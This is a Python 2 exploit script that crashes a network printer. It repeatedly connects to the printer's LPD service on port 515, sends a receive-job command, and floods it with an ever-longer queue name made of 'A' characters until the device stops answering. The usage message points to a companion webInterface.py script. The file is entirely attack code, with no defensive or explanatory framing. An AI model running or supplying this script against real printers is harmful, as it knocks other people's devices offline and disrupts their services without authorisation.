import socket
import sys
import os
import httplib
import signal

if len(sys.argv) < 2:
    print("Usage: python exploit.py printerIpAddress")
    print("After the script is started, execute the webInterface.py script")
    sys.exit(0)

ipAddress = sys.argv[1]


i = 0

while True:
    i += 1
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ipAddress, 515))

    except:
        # If the connection fails, printer has crashed
        print("Unable to connect")
        sys.exit(0)

    # Send receive a printer job -command. Queue name will be as long as
    # possible. The printer will disconnect when the queue name has reached it's
    # maximum length
    s.send("\x02")
    j = 0
    while True:
        j += 1
        s.send("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        print(str(i) + "." + str(j))
        
    s.close()

    print(i)

